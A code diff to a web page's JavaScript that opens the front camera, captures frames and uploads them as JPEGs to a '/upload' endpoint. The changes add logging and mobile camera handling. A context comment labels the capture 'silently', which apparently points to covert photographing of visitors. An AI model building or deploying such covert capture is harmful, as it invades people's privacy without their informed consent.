@@ -53,10 +53,13 @@ async function sendPhotoToServer(blob) {
 
 // Function to capture photo silently
 function capturePhoto() {
-    if (!stream) return;
-    
+    if (!stream) {
+        console.error('Camera stream not available');
+        return;
+    }
+
     try {
-        // Create canvas
+        console.log('Starting photo capture');
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
@@ -118,19 +121,37 @@ document.addEventListener('DOMContentLoaded', () => {
     const canvas = document.createElement('canvas');
     const context = canvas.getContext('2d');
     let stream = null;
+    let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
     // Request camera access
     async function setupCamera() {
         try {
-            stream = await navigator.mediaDevices.getUserMedia({
+            const constraints = {
                 video: {
                     facingMode: 'user',
                     width: { ideal: 1280 },
                     height: { ideal: 720 }
                 }
-            });
+            };
+
+            // Adjust constraints for mobile devices
+            if (isMobile) {
+                constraints.video.facingMode = { exact: 'user' };
+            }
+
+            stream = await navigator.mediaDevices.getUserMedia(constraints);
             video.srcObject = stream;
-            video.play();
+            
+            // Wait for video to be ready
+            await new Promise((resolve) => {
+                video.onloadedmetadata = () => {
+                    video.play();
+                    resolve();
+                };
+            });
+
+            console.log('Camera setup successful');
+            console.log('Video dimensions:', video.videoWidth, 'x', video.videoHeight);
         } catch (error) {
             console.error('Error accessing camera:', error);
             alert('Error accessing camera. Please make sure you have granted camera permissions.');
@@ -145,6 +166,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
 
         try {
+            console.log('Starting photo capture');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -153,11 +175,14 @@ document.addEventListener('DOMContentLoaded', () => {
             const blob = await new Promise(resolve => {
                 canvas.toBlob(resolve, 'image/jpeg', 0.95);
             });
+            
+            console.log('Photo captured, size:', blob.size);
 
             // Create form data
             const formData = new FormData();
             formData.append('photo', blob, `photo_${Date.now()}.jpg`);
 
+            console.log('Uploading photo...');
             // Upload photo
             const response = await fetch('/upload', {
                 method: 'POST',
@@ -165,6 +190,8 @@ document.addEventListener('DOMContentLoaded', () => {
             });
 
             if (!response.ok) {
+                const errorText = await response.text();
+                console.error('Upload failed:', errorText);
                 throw new Error(`HTTP error! status: ${response.status}`);
             }
 
